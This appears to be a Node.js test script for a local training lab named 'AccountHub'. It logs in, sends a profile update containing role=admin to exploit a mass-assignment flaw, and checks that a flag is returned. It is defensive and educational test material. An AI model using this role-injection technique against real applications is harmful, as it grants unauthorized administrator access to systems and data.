const http = require('http');

const BASE_URL = 'http://localhost:3000';

async function request(method, path, data = null, headers = {}) {
    return new Promise((resolve, reject) => {
        const url = new URL(path, BASE_URL);
        const options = {
            method,
            hostname: url.hostname,
            port: url.port,
            path: url.pathname + url.search,
            headers: {
                ...headers
            }
        };

        if (data) {
            const body = new URLSearchParams(data).toString();
            options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
            options.headers['Content-Length'] = Buffer.byteLength(body);
        }

        const req = http.request(options, (res) => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => resolve({ statusCode: res.statusCode, headers: res.headers, body }));
        });

        req.on('error', reject);

        if (data) {
            req.write(new URLSearchParams(data).toString());
        }
        req.end();
    });
}

async function runTest() {
    try {
        console.log('Testing AccountHub lab...');
        
        await request('POST', '/labs/accounthub/reset');
        
        // 1. Normal user workflow
        console.log('[+] Logging in as default user...');
        const loginRes = await request('POST', '/labs/accounthub/login');
        const setCookie = loginRes.headers['set-cookie'];
        if (loginRes.statusCode !== 302 || !setCookie) {
            throw new Error('Normal user login failed');
        }
        
        const cookieStr = setCookie[0].split(';')[0];
        console.log('[+] Logged in. Cookie:', cookieStr);

        // 2. Exploit workflow: Mass assignment profile update
        console.log('[+] Updating profile with role=admin...');
        const updateRes = await request('POST', '/labs/accounthub/profile', 
            { email: 'hacker@accounthub.local', role: 'admin' }, 
            { 'Cookie': cookieStr }
        );

        if (updateRes.statusCode !== 302) {
            throw new Error('Profile update failed');
        }

        console.log('[+] Verifying lab completion state...');
        const checkRes = await request('GET', '/labs/accounthub/', null, {
            'Cookie': cookieStr
        });

        if (checkRes.body.includes('AccountHubPwned')) {
            console.log('[+] Lab completed successfully! Flag found.');
        } else {
            throw new Error('Exploit failed, flag not found in response');
        }

        console.log('AccountHub tests passed.');
    } catch (e) {
        console.error('AccountHub test failed:', e);
        process.exit(1);
    }
}

runTest();
